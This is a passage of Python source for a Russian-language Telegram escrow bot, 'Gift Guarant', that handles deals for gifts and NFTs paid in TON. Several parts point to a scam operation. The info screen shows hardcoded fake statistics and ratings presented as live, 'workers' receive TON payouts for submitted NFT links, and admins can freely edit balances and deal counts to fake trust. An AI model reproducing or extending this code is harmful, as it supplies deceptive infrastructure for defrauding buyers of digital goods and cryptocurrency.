                    user_data[seller_id]['balance'] = user_data[seller_id].get('balance', 0) + amount
                    save_user_data(seller_id)
                    
                    deal['status'] = 'confirmed'
                    save_deal(deal_id)

                    message_text = get_text(lang, "payment_confirmed_message", deal_id=deal_id)
                    await query.edit_message_text(text=message_text, parse_mode="HTML")

                    buyer_username = "Неизвестно"
                    try:
                        buyer_chat_info = await context.bot.get_chat(buyer_id)
                        buyer_username = buyer_chat_info.username or "Неизвестно"
                    except Exception as e:
                        logger.error(f"Failed to get buyer username: {e}")

                    seller_lang = user_data.get(seller_id, {}).get('lang', 'ru')
                    buyer_successful_deals = user_data.get(buyer_id, {}).get('successful_deals', 0)
                    buyer_rating = (buyer_successful_deals / 5.0) if buyer_successful_deals > 0 else 0.0
                    
                    seller_message = get_text(seller_lang, "payment_confirmed_seller_message",
                                             deal_id=deal_id, 
                                             description=deal.get('description', ''), 
                                             buyer_username=buyer_username,
                                             successful_deals=buyer_successful_deals,
                                             rating=f"{buyer_rating:.1f}",
                                             amount=deal.get('amount', 0),
                                             valute=deal.get('payment_method', 'TON').upper())
                    await context.bot.send_message(
                        seller_id,
                        seller_message,
                        parse_mode="HTML",
                        reply_markup=InlineKeyboardMarkup([
                            [InlineKeyboardButton(get_text(seller_lang, "seller_confirm_sent_button"), callback_data=f'seller_confirm_sent_{deal_id}')],
                            [InlineKeyboardButton(get_text(seller_lang, "contact_support_button"), url='https://t.me/MarketSupportGifts')]
                        ])
                    )
                    
                    # Отправляем уведомление о подтверждении сделки
                    seller_display = await get_user_display_name(context, seller_id)
                    buyer_display = await get_user_display_name(context, buyer_id)
                    notification_text = (
                        f"✅ Сделка подтверждена\n"
                        f"ID: #{deal_id}\n"
                        f"Сумма: {deal['amount']} {deal['payment_method'].upper()}\n"
                        f"Продавец: {seller_display}\n"
                        f"Покупатель: {buyer_display}"
                    )
                    await send_notification_to_chat(context, notification_text)
                else:
                    message_text = get_text(lang, "insufficient_balance_message")
                    await query.edit_message_text(
                        text=message_text,
                        parse_mode="HTML",
                        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu_from_deal')]])
                    )

        elif data.startswith('seller_confirm_sent_'):
            deal_id = data[len('seller_confirm_sent_'):]
            deal = deals.get(deal_id)
            if deal and deal.get('status') == 'confirmed' and user_id == deal.get('seller_id'):
                deal['status'] = 'seller_sent'
                save_deal(deal_id)
                
                buyer_id = deal.get('buyer_id')
                buyer_lang = user_data.get(buyer_id, {}).get('lang', 'ru') if buyer_id else 'ru'
                
                seller_username = "Неизвестно"
                try:
                    seller_chat_info = await context.bot.get_chat(user_id)
                    seller_username = seller_chat_info.username or "Неизвестно"
                except Exception:
                    pass

                message_text = get_text(lang, "seller_confirm_sent_message", deal_id=deal_id)
                await query.edit_message_text(text=message_text, parse_mode="HTML")
                
                if buyer_id:
                    buyer_message = get_text(buyer_lang, "seller_confirm_sent_notification", seller_username=seller_username, deal_id=deal_id)
                    await context.bot.send_message(
                        buyer_id,
                        buyer_message,
                        parse_mode="HTML",
                        reply_markup=InlineKeyboardMarkup([
                            [InlineKeyboardButton(get_text(buyer_lang, "buyer_confirm_received_button"), callback_data=f'buyer_confirm_received_{deal_id}')],
                            [InlineKeyboardButton(get_text(buyer_lang, "contact_support_button"), url='https://t.me/GiftGuarantSup')]
                        ])
                    )
                    
                # Отправляем уведомление о подтверждении отправки
                seller_display = await get_user_display_name(context, user_id)
                buyer_display = await get_user_display_name(context, buyer_id) if buyer_id else "Не указан"
                notification_text = (
                    f"📦 Продавец подтвердил отправку\n"
                    f"ID сделки: #{deal_id}\n"
                    f"Продавец: {seller_display}\n"
                    f"Покупатель: {buyer_display}"
                )
                await send_notification_to_chat(context, notification_text)

        elif data.startswith('buyer_confirm_received_'):
            deal_id = data[len('buyer_confirm_received_'):]
            deal = deals.get(deal_id)
            if deal and deal.get('status') == 'seller_sent' and user_id == deal.get('buyer_id'):
                deal['status'] = 'completed'
                save_deal(deal_id)
                
                seller_id = deal['seller_id']
                
                message_text = get_text(lang, "buyer_confirm_received_message", deal_id=deal_id)
                await query.edit_message_text(text=message_text, parse_mode="HTML")
                
                if seller_id:
                    ensure_user_exists(seller_id)
                    user_data[seller_id]['successful_deals'] = user_data[seller_id].get('successful_deals', 0) + 1
                    save_user_data(seller_id)
                
                for admin_id_loop in ADMIN_ID:
                    try:
                        await context.bot.send_message(
                            admin_id_loop,
                            f"✅ Сделка #{deal_id} завершена.\nПокупатель подтвердил получение.",
                            parse_mode="HTML"
                        )
                    except Exception as e:
                        logger.error(f"Failed to send completion to admin {admin_id_loop}: {e}")

                if deal_id in deals:
                    del deals[deal_id]
                delete_deal(deal_id)
                
                # Отправляем уведомление о завершении сделки
                seller_display = await get_user_display_name(context, seller_id)
                buyer_display = await get_user_display_name(context, user_id)
                notification_text = (
                    f"🏁 Сделка завершена\n"
                    f"ID: #{deal_id}\n"
                    f"Продавец: {seller_display}\n"
                    f"Покупатель: {buyer_display}\n"
                    f"Сумма: {deal['amount']} {deal['payment_method'].upper()}"
                )
                await send_notification_to_chat(context, notification_text)

        elif data == 'referral':
            bot_username = (await context.bot.get_me()).username
            referral_link = f"https://t.me/{bot_username}?start={user_id}"
            message_text = get_text(lang, "referral_message", referral_link=referral_link, valute=VALUTE)
            await query.edit_message_caption(
                caption=message_text,
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')]])
            )

        elif data == 'worker_payout':
            context.user_data['payout_step'] = 1
            context.user_data['payout_data'] = {}
            await query.edit_message_text(
                text=(
                    "💰 <b>Создание заявки на выплату</b>\n\n"
                    "📌 <b>Шаг 1:</b> Отправьте адрес вашего TON кошелька\n\n"
                    "Пример: UQAbc123...xyz\n\n"
                    "Требования:\n"
                    "• Начинается с EQ или UQ\n"
                    "• Содержит ровно 48 символов"
                ),
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Назад", callback_data='menu')]])
            )

        elif data == 'worker_otc':
            otc_message = (
                f"🤖 <b>ОТС Боты для трейда:</b>\n\n"
                f"� <b>Gift Guarant:</b>\n{GIFTGUARANT_BOT}"
            )
            await query.edit_message_text(
                text=otc_message,
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("Gift Guarant Bot", url=f"https://t.me/{GIFTGUARANT_BOT.replace('@', '')}")],
                    [InlineKeyboardButton("🔙 Назад", callback_data='menu')]
                ])
            )

        elif data.startswith('approve_payout_'):
            request_id = data.replace('approve_payout_', '')
            admin_id = user_id
            
            # Одобряем заявку в БД
            conn = sqlite3.connect(DB_NAME)
            cursor = conn.cursor()
            try:
                cursor.execute('''
                    UPDATE payout_requests 
                    SET status = 'approved', approved_at = datetime('now'), approved_by = ?
                    WHERE request_id = ?
                ''', (admin_id, request_id))
                conn.commit()
                
                # Получаем данные заявки
                cursor.execute('''
                    SELECT user_id, amount, wallet, nft_link FROM payout_requests WHERE request_id = ?
                ''', (request_id,))
                payout_data = cursor.fetchone()
                
                if payout_data:
                    payout_user_id, amount, wallet, nft_link = payout_data
                    
                    # очистим поле NFT от случайных слов "Изображение" и других мусорных строк
                    nft_link = sanitize_nft_text(nft_link)
                    
                    # Получаем информацию о воркере
                    seller_display = await get_user_display_name(context, payout_user_id)
                    
                    # Отправляем в канал выплат
                    payout_notification = (
                        f"💳 <b>Выплата одобрена</b>\n\n"
                        f"👤 <b>Воркер:</b> {seller_display}\n"
                        f"🆔 <b>ID:</b> <code>{payout_user_id}</code>\n"
                        f"💰 <b>Сумма:</b> <code>{amount:.2f}</code> TON\n"
                        f"👛 <b>Кошелек:</b> <code>{wallet}</code>\n"
                        f"🖼 <b>NFT:</b> {nft_link}\n\n"
                        f"📋 <b>ID заявки:</b> <code>{request_id}</code>\n"
                        f"✅ <b>Статус:</b> Одобрено\n"
                        f"🕐 <b>Время:</b> {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}"
                    )
                    
                    try:
                        # Ссылка с опечаткой PAYOUTS_CHANNEL - это URL, поэтому отправляем в чат
                        if NOTIFICATION_CHAT_ID:
                            await context.bot.send_message(
                                chat_id=NOTIFICATION_CHAT_ID,
                                text=payout_notification,
                                parse_mode="HTML"
                            )
                            logger.info(f"Информация о выплате отправлена в уведомления")
                    except Exception as e:
                        logger.error(f"Не удалось отправить в канал выплат: {e}")
                    
                    # Уведомляем воркера
                    notification = (
                        f"✅ <b>Заявка на выплату одобрена!</b>\n\n"
                        f"📋 ID заявки: <code>{request_id}</code>\n"
                        f"💰 Сумма: <code>{amount:.2f}</code> TON\n"
                        f"👛 Кошелек: <code>{wallet}</code>\n\n"
                        f"⏳ Выплата будет отправлена в течение 24 часов."
                    )
                    try:
                        await context.bot.send_message(
                            chat_id=payout_user_id,
                            text=notification,
                            parse_mode="HTML"
                        )
                    except Exception as e:
                        logger.error(f"Не удалось отправить уведомление воркеру {payout_user_id}: {e}")
                
                # Редактируем сообщение админу
                await query.edit_message_caption(
                    caption=(
                        f"✅ <b>Заявка одобрена</b>\n\n"
                        f"📋 ID заявки: <code>{request_id}</code>\n"
                        f"✅ Статус: Одобрено\n"
                        f"👤 Одобрено: {user_id}"
                    ),
                    parse_mode="HTML"
                )
                logger.info(f"Заявка {request_id} одобрена админом {admin_id}")
                
            except Exception as e:
                logger.error(f"Ошибка при одобрении заявки: {e}")
                await query.answer("❌ Ошибка при одобрении заявки", show_alert=True)
            finally:
                conn.close()

        elif data.startswith('reject_payout_'):
            request_id = data.replace('reject_payout_', '')
            admin_id = user_id
            
            # Отклоняем заявку в БД
            conn = sqlite3.connect(DB_NAME)
            cursor = conn.cursor()
            try:
                cursor.execute('''
                    UPDATE payout_requests 
                    SET status = 'rejected', approved_at = datetime('now'), approved_by = ?
                    WHERE request_id = ?
                ''', (admin_id, request_id))
                conn.commit()
                
                # Получаем данные заявки
                cursor.execute('''
                    SELECT user_id, amount FROM payout_requests WHERE request_id = ?
                ''', (request_id,))
                payout_data = cursor.fetchone()
                
                if payout_data:
                    payout_user_id, amount = payout_data
                    
                    # Уведомляем воркера об отклонении
                    notification = (
                        f"❌ <b>Заявка на выплату отклонена</b>\n\n"
                        f"📋 ID заявки: <code>{request_id}</code>\n"
                        f"💰 Сумма: <code>{amount:.2f}</code> TON\n\n"
                        f"⚠️ Свяжитесь с администратором для получения подробной информации."
                    )
                    try:
                        await context.bot.send_message(
                            chat_id=payout_user_id,
                            text=notification,
                            parse_mode="HTML"
                        )
                    except Exception as e:
                        logger.error(f"Не удалось отправить уведомление воркеру {payout_user_id}: {e}")
                
                # Редактируем сообщение админу
                await query.edit_message_caption(
                    caption=(
                        f"❌ <b>Заявка отклонена</b>\n\n"
                        f"📋 ID заявки: <code>{request_id}</code>\n"
                        f"❌ Статус: Отклонено\n"
                        f"👤 Отклонено: {user_id}"
                    ),
                    parse_mode="HTML"
                )
                logger.info(f"Заявка {request_id} отклонена админом {admin_id}")
                
            except Exception as e:
                logger.error(f"Ошибка при отклонении заявки: {e}")
                await query.answer("❌ Ошибка при отклонении заявки", show_alert=True)
            finally:
                conn.close()

        elif data == 'my_deals':
            keyboard = [
                [InlineKeyboardButton(get_text(lang, "gifts_type"), callback_data='my_deals_gifts')],
                [InlineKeyboardButton(get_text(lang, "channel_type"), callback_data='my_deals_channel')],
                [InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')]
            ]
            message_text = get_text(lang, "my_deals_header") + "\n\n" + get_text(lang, "select_deal_type")
            video_file = 'video/my_deals_eng.mp4' if lang == 'en' else 'video/my_deals_ru.mp4'
            try:
                with open(video_file, 'rb') as vf:
                    await query.message.delete()
                    await context.bot.send_video(
                        chat_id,
                        video=vf,
                        caption=message_text,
                        parse_mode="HTML",
                        reply_markup=InlineKeyboardMarkup(keyboard)
                    )
            except Exception as e:
                logger.error(f"Ошибка при отправке видео сделок: {e}")
                await query.edit_message_caption(
                    caption=message_text,
                    parse_mode="HTML",
                    reply_markup=InlineKeyboardMarkup(keyboard)
                )

        elif data == 'my_deals_gifts' or data == 'my_deals_channel':
            user_deals = [d for d in deals.values() if d.get('seller_id') == user_id or d.get('buyer_id') == user_id]
            if not user_deals:
                message_text = get_text(lang, "no_deals")
                keyboard = [
                    [InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')]
                ]
            else:
                message_text = get_text(lang, "your_deals_message")
                for i, deal in enumerate(user_deals, 1):
                    message_text += f"\n\n#{i}. {get_text(lang, 'deal_number', number=i)}\n"
                    message_text += f"{get_text(lang, 'deal_status', status=deal.get('status', 'active'))}"
                
                keyboard = [
                    [InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')]
                ]
            
            await query.edit_message_caption(
                caption=message_text,
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )

        elif data == 'settings':
            keyboard = [
                [InlineKeyboardButton(get_text(lang, "referral_system"), callback_data='settings_referral')],
                [InlineKeyboardButton(get_text(lang, "select_language"), callback_data='change_lang')],
                [InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')]
            ]
            message_text = get_text(lang, "settings_header")
            video_file = 'video/settings_eng.mp4' if lang == 'en' else 'video/settings_ru.mp4'
            try:
                with open(video_file, 'rb') as vf:
                    await query.message.delete()
                    await context.bot.send_video(
                        chat_id,
                        video=vf,
                        caption=message_text,
                        parse_mode="HTML",
                        reply_markup=InlineKeyboardMarkup(keyboard)
                    )
            except Exception as e:
                logger.error(f"Ошибка при отправке видео настроек: {e}")
                await query.edit_message_caption(
                    caption=message_text,
                    parse_mode="HTML",
                    reply_markup=InlineKeyboardMarkup(keyboard)
                )

        elif data == 'settings_referral':
            bot_username = (await context.bot.get_me()).username
            referral_link = f"https://t.me/{bot_username}?start=ref{user_id}"
            
            message_text = (
                get_text(lang, "referral_system") + "\n\n" +
                get_text(lang, "your_referral_percent", percent="1.0") + "\n" +
                get_text(lang, "invited_users", count="0") + "\n" +
                get_text(lang, "ref_balance_ton", balance="0.0") + "\n" +
                get_text(lang, "ref_balance_usdt", balance="0.0") + "\n\n" +
                get_text(lang, "your_referral_link", link=referral_link)
            )
            
            keyboard = [
                [InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='settings')]
            ]
            await query.edit_message_caption(
                caption=message_text,
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )

        elif data == 'change_lang':
            message_text = get_text(lang, "change_lang_message")
            video_file = 'video/select_language.mp4'
            try:
                with open(video_file, 'rb') as vf:
                    await query.message.delete()
                    await context.bot.send_video(
                        chat_id,
                        video=vf,
                        caption=message_text,
                        parse_mode="HTML",
                        reply_markup=InlineKeyboardMarkup([
                            [InlineKeyboardButton(get_text(lang, "english_lang_button"), callback_data='lang_en')],
                            [InlineKeyboardButton(get_text(lang, "russian_lang_button"), callback_data='lang_ru')],
                            [InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='settings')]
                        ])
                    )
            except Exception as e:
                logger.error(f"Ошибка при отправке видео языков: {e}")
                await query.edit_message_caption(
                    caption=message_text,
                    parse_mode="HTML",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton(get_text(lang, "english_lang_button"), callback_data='lang_en')],
                        [InlineKeyboardButton(get_text(lang, "russian_lang_button"), callback_data='lang_ru')],
                        [InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='settings')]
                    ])
                )

        elif data == 'info':
            info_message = """📊 <b>Статистика Gift Guarant</b>

🤝 Всего сделок: 106957
✅ Успешных сделок: 103699
💰 Общий объем: $1103294
⭐️ Средний рейтинг: 4.9/5.0
🟢 Онлайн сейчас: 17011

📈 <b>Наши преимущества:</b>
• 🔒 Гарант-сервис на все сделки
• ⚡️ Мгновенная доставка товаров
• 🛡 Защита от мошенников
• 💎 Проверенные продавцы
• 📞 24/7 Поддержка
• ⭐️ 99.8% положительных отзывов

⭐️ <b>Наш канал:</b> https://t.me/lolzteam
📞 <b>Поддержка:</b> @MarketSupportGifts

<i>Статистика обновляется каждые 5 минут</i>"""
            await query.edit_message_caption(
                caption=info_message,
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')]])
            )

        elif data == 'appeal_menu':
            appeal_message = """📝 <b>Центр обращений Gift Guarant</b>

⚙️ <b>Раздел предложений и идей:</b>
• Предложения по улучшению функционала
• Идеи для новых функций
• Запросы на интеграции
• Отзывы о пользовательском опыте

⛔️ <b>Раздел жалоб и претензий:</b>
• Жалобы на пользователей
• Проблемы со сделками
• Технические проблемы
• Некорректное поведение
• Предполагаемое мошенничество

📞 <b>Важная информация:</b>
• Все обращения рассматриваются в течение 24 часов
• Конфиденциальность гарантируется
• По жалобам на мошенничество — моментальная реакция
• Лучшие предложения внедряются в бота

👇 <b>Выберите раздел для обращения:</b>"""
            await query.edit_message_caption(
                caption=appeal_message,
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("💡 Предложить", callback_data='appeal_suggest')],
                    [InlineKeyboardButton("⚠️ Пожаловаться", callback_data='appeal_complain')],
                    [InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')]
                ])
            )

        elif data == 'appeal_suggest':
            await query.edit_message_caption(
                caption="""✍️ <b>Напишите ваше предложение:</b>

ℹ️ Опишите подробно вашу идею, как она улучшит работу бота и какие преимущества принесет пользователям.

(Отправьте текст обычным сообщением)""",
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')]])
            )
            admin_commands[user_id] = 'appeal_suggest'

        elif data == 'appeal_complain':
            await query.edit_message_caption(
                caption="""⛔️ <b>Напишите вашу жалобу:</b>

ℹ️ Укажите:
• ID пользователя/сделки
• Суть проблемы
• Скриншоты (если есть)
• Желаемое решение

(Отправьте текст обычным сообщением)""",
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')]])
            )
            admin_commands[user_id] = 'appeal_complain'

        elif data.startswith('lang_'):
            new_lang = data.split('_')[-1]
            ensure_user_exists(user_id)
            user_data[user_id]['lang'] = new_lang
            save_user_data(user_id)
            
            keyboard = [
                [InlineKeyboardButton(get_text(new_lang, "wallet_button"), callback_data='wallet_menu'), InlineKeyboardButton(get_text(new_lang, "create_deal_button"), callback_data='create_deal')],
                [InlineKeyboardButton(get_text(new_lang, "my_deals_button"), callback_data='my_deals'), InlineKeyboardButton(get_text(new_lang, "settings_button"), callback_data='settings')],
                [InlineKeyboardButton(get_text(new_lang, "referral_button"), callback_data='referral'), InlineKeyboardButton(get_text(new_lang, "change_lang_button"), callback_data='change_lang')],
                [InlineKeyboardButton("📊 Подробнее", callback_data='info'), InlineKeyboardButton("💬 Обращения", callback_data='appeal_menu')],
                [InlineKeyboardButton("� Поддержка", url='https://t.me/GiftGuarantSup'), InlineKeyboardButton("🎮 Мини-Приложение", web_app=WebAppInfo(url='https://lzt.market/'))],
            ]
            if user_id in ADMIN_ID:
                keyboard.append([InlineKeyboardButton("🔧 Админ-панель", callback_data='admin_panel')])
            
            welcome_message = """<b>Добро пожаловать в Gift Guarant</b>

Безопасные сделки с гарантией

🛡 Защита от мошенников
💰 Автоматическое удержание средств
📝 Прозрачная статистика
🎯 Поддержка 24/7
📊 История сделок"""
            
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_caption(
                caption=welcome_message,
                parse_mode="HTML",
                reply_markup=reply_markup
            )
            return

        elif data == 'admin_panel' and user_id in ADMIN_ID:
            keyboard = [
                [InlineKeyboardButton(get_text(lang, "admin_view_deals_button"), callback_data='admin_view_deals_0')],
                [InlineKeyboardButton(get_text(lang, "admin_change_balance_button"), callback_data='admin_change_balance')],
                [InlineKeyboardButton(get_text(lang, "admin_change_successful_deals_button"), callback_data='admin_change_successful_deals')],
                [InlineKeyboardButton(get_text(lang, "admin_change_valute_button"), callback_data='admin_change_valute')],
                [InlineKeyboardButton(get_text(lang, "admin_manage_admins_button"), callback_data='admin_manage_admins')],
                [InlineKeyboardButton(get_text(lang, "admin_list_button"), callback_data='admin_list')],
                [InlineKeyboardButton("💬 Установить чат уведомлений", callback_data='set_notification_chat')],
                [InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')],
            ]
            if user_id in SUPER_ADMIN_IDS:
                keyboard.insert(0, [InlineKeyboardButton("🔗 Рассылка", callback_data='admin_broadcast')])
            message_text = get_text(lang, "admin_panel_message")
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_caption(caption=message_text, parse_mode="HTML", reply_markup=reply_markup)

        elif data == 'set_notification_chat' and user_id in SUPER_ADMIN_IDS:
            message_text = "Введите ID чата для уведомлений (например, -1001234567890):"
            await query.edit_message_caption(
                caption=message_text,
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Назад", callback_data='admin_panel')]])
            )
            admin_commands[user_id] = 'set_notification_chat'

        elif data == 'admin_broadcast' and user_id in SUPER_ADMIN_IDS:
            message_text = get_text(lang, "admin_broadcast_message", default="Введите текст для рассылки всем пользователям:")
            await query.edit_message_caption(
                caption=message_text,
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='admin_panel')]])
            )
            admin_commands[user_id] = 'broadcast'

        elif data == 'admin_list' and user_id in ADMIN_ID:
            admin_list_entries = []
            for admin_id_loop in ADMIN_ID:
                try:
                    ensure_user_exists(admin_id_loop)
                    admin_chat = await context.bot.get_chat(admin_id_loop)
                    username = admin_chat.username or "Нет юзернейма"
                    granted_by_id = user_data.get(admin_id_loop, {}).get('granted_by')
                    granted_by_username = "Не указан"
                    if granted_by_id:
                        try:
                            granted_by_chat = await context.bot.get_chat(granted_by_id)
                            granted_by_username = granted_by_chat.username or "Не указан"
                        except Exception:
                            granted_by_username = "Не удалось получить"
                    admin_list_entries.append(f"@{username} | ID: {admin_id_loop} | Выдано: @{granted_by_username}")
                except Exception as e:
                    logger.error(f"Ошибка при получении данных администратора {admin_id_loop}: {e}")
                    admin_list_entries.append(f"ID: {admin_id_loop} | Ошибка получения данных")
            admin_list_text = "\n".join(admin_list_entries) or "🚫 Список администраторов пуст."
            message_text = get_text(lang, "admin_list_message", admin_list=admin_list_text)
            
            reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='admin_panel')]])

            if query.message.photo:
                await query.message.delete()
                await context.bot.send_message(
                    chat_id=chat_id,
                    text=message_text,
                    parse_mode="HTML",
                    reply_markup=reply_markup
                )
            else:
                await query.edit_message_text(
                    text=message_text,
                    parse_mode="HTML",
                    reply_markup=reply_markup
                )
        
        elif data.startswith('admin_view_deals_') and user_id in ADMIN_ID:
            DEALS_PER_PAGE = 8
            try:
                page = int(data.split('_')[-1])
            except (ValueError, IndexError):
                page = 0

            all_active_deals = [(deal_id, deal_info) for deal_id, deal_info in deals.items() if deal_info.get('status') == 'active']

            if not all_active_deals:
                await query.edit_message_caption(caption="🚫 Нет активных сделок.", parse_mode="HTML")
                return

            start_index = page * DEALS_PER_PAGE
            end_index = start_index + DEALS_PER_PAGE
            deals_on_page = all_active_deals[start_index:end_index]
            total_pages = (len(all_active_deals) + DEALS_PER_PAGE - 1) // DEALS_PER_PAGE

            keyboard_rows = []
            for deal_id_loop, deal_info_loop in deals_on_page:
                amount = deal_info_loop.get('amount', 'N/A')
                payment_method_text = deal_info_loop.get('payment_method', 'N/A').upper()
                keyboard_rows.append([InlineKeyboardButton(f"💳 Сделка #{deal_id_loop[:10]} ({amount} {payment_method_text})", callback_data=f'admin_view_deal_{deal_id_loop}')])
            
            nav_buttons = []
            if page > 0:
                nav_buttons.append(InlineKeyboardButton("⬅️ Назад", callback_data=f'admin_view_deals_{page - 1}'))
            nav_buttons.append(InlineKeyboardButton(f"📄 {page + 1}/{total_pages}", callback_data='noop'))
            if end_index < len(all_active_deals):
                nav_buttons.append(InlineKeyboardButton("Вперед ➡️", callback_data=f'admin_view_deals_{page + 1}'))
            
            if nav_buttons:
                keyboard_rows.append(nav_buttons)
            keyboard_rows.append([InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='admin_panel')])
            
            reply_markup = InlineKeyboardMarkup(keyboard_rows)
            message_text = get_text(lang, "admin_view_deals_message", deals_list="")

            try:
                await query.edit_message_caption(caption=message_text, reply_markup=reply_markup, parse_mode="HTML")
            except BadRequest as e:
                if "Message is not modified" not in str(e):
                    logger.error(f"Error editing message for deal list: {e}")

        elif data.startswith('admin_view_deal_') and user_id in ADMIN_ID:
            deal_id = data[len('admin_view_deal_'):]
            deal = deals.get(deal_id)
            if deal:
                seller_id, buyer_id = deal.get('seller_id'), deal.get('buyer_id')
                seller_username = "Неизвестно"
                if seller_id:
                    try:
                        seller_username = (await context.bot.get_chat(seller_id)).username or "Неизвестно"
                    except Exception:
                        pass
                buyer_username = "Не указан"
                if buyer_id:
                    try:
                        buyer_username = (await context.bot.get_chat(buyer_id)).username or "Неизвестно"
                    except Exception:
                        pass

                status = deal.get('status', 'active')
                deal_payment_method = deal.get('payment_method', 'ton')
                valute = "TON" if deal_payment_method == "ton" else "RUB" if deal_payment_method == "sbp" else "XTR"
                
                payment_details = "Реквизиты не указаны"
                if seller_id:
                    ensure_user_exists(seller_id)
                    seller_lang = user_data.get(seller_id, {}).get('lang', 'ru')
                    if deal_payment_method == 'ton':
                        payment_details = user_data[seller_id].get('ton_wallet') or get_text(seller_lang, "not_specified_wallet")
                    elif deal_payment_method == 'sbp':
                        payment_details = user_data[seller_id].get('card_details') or get_text(seller_lang, "not_specified_card")
                    elif deal_payment_method == 'stars':
                        payment_details = "Оплата через Telegram Stars"
                
                message_text = get_text(lang, "admin_view_deal_message",
                                        deal_id=deal_id, seller_id=seller_id or "N/A", seller_username=seller_username,
                                        seller_successful_deals=user_data.get(seller_id, {}).get('successful_deals', 0) if seller_id else 0,
                                        buyer_id=buyer_id or "Не указан", buyer_username=buyer_username,
                                        buyer_successful_deals=user_data.get(buyer_id, {}).get('successful_deals', 0) if buyer_id else 0,
                                        description=deal.get('description', ''), amount=deal.get('amount', 0), valute=valute,
                                        payment_details=payment_details, status=status)
                
                await query.edit_message_caption(
                    caption=message_text,
                    parse_mode="HTML",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton(get_text(lang, "admin_confirm_deal_button"), callback_data=f'admin_confirm_deal_{deal_id}'),
                         InlineKeyboardButton(get_text(lang, "admin_cancel_deal_button"), callback_data=f'admin_cancel_deal_{deal_id}')],
                        [InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='admin_view_deals_0')]
                    ])
                )

        elif data.startswith('admin_confirm_deal_') and user_id in ADMIN_ID:
            deal_id = data[len('admin_confirm_deal_'):]
            deal = deals.get(deal_id)
            if deal and deal.get('status') == 'active':
                deal['status'] = 'confirmed'
                save_deal(deal_id)
                seller_id, buyer_id = deal['seller_id'], deal.get('buyer_id')
                buyer_lang = user_data.get(buyer_id, {}).get('lang', 'ru') if buyer_id else 'ru'
                seller_lang = user_data.get(seller_id, {}).get('lang', 'ru')
                buyer_username = "Неизвестно"
                if buyer_id:
                    try:
                        buyer_username = (await context.bot.get_chat(buyer_id)).username or "Неизвестно"
                    except Exception:
                        pass
                
                message_text = get_text(lang, "admin_confirm_deal_message", deal_id=deal_id)
                await query.edit_message_caption(
                    caption=message_text,
                    parse_mode="HTML",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='admin_panel')]])
                )
                
                if buyer_id:
                    await context.bot.send_message(buyer_id, get_text(buyer_lang, "payment_confirmed_message", deal_id=deal_id), parse_mode="HTML")
                
                buyer_successful_deals = user_data.get(buyer_id, {}).get('successful_deals', 0) if buyer_id else 0
                buyer_rating = (buyer_successful_deals / 5.0) if buyer_successful_deals > 0 else 0.0
                
                seller_message = get_text(seller_lang, "payment_confirmed_seller_message", 
                                         deal_id=deal_id, 
                                         description=deal.get('description', ''), 
                                         buyer_username=buyer_username,
                                         successful_deals=buyer_successful_deals,
                                         rating=f"{buyer_rating:.1f}",
                                         amount=deal.get('amount', 0),
                                         valute=deal.get('payment_method', 'TON').upper())
                await context.bot.send_message(seller_id, seller_message, parse_mode="HTML", reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton(get_text(seller_lang, "seller_confirm_sent_button"), callback_data=f'seller_confirm_sent_{deal_id}')],
                    [InlineKeyboardButton(get_text(seller_lang, "contact_support_button"), url='https://t.me/MarketSupportGifts')]
                ]))
                
                # Отправляем уведомление о подтверждении сделки
                seller_display = await get_user_display_name(context, seller_id)
                buyer_display = await get_user_display_name(context, buyer_id) if buyer_id else "Не указан"
                notification_text = (
                    f"✅ Сделка подтверждена администратором\n"
                    f"ID: #{deal_id}\n"
                    f"Сумма: {deal['amount']} {deal['payment_method'].upper()}\n"
                    f"Продавец: {seller_display}\n"
                    f"Покупатель: {buyer_display}"
                )
                await send_notification_to_chat(context, notification_text)

        elif data.startswith('admin_cancel_deal_') and user_id in ADMIN_ID:
            deal_id = data[len('admin_cancel_deal_'):]
            deal = deals.get(deal_id)
            if deal:
                deal['status'] = 'cancelled'
                save_deal(deal_id)
                seller_id, buyer_id = deal.get('seller_id'), deal.get('buyer_id')
                buyer_lang = user_data.get(buyer_id, {}).get('lang', 'ru') if buyer_id else 'ru'
                seller_lang = user_data.get(seller_id, {}).get('lang', 'ru')
                
                message_text = get_text(lang, "admin_cancel_deal_message", deal_id=deal_id)
                await query.edit_message_caption(
                    caption=message_text,
                    parse_mode="HTML",
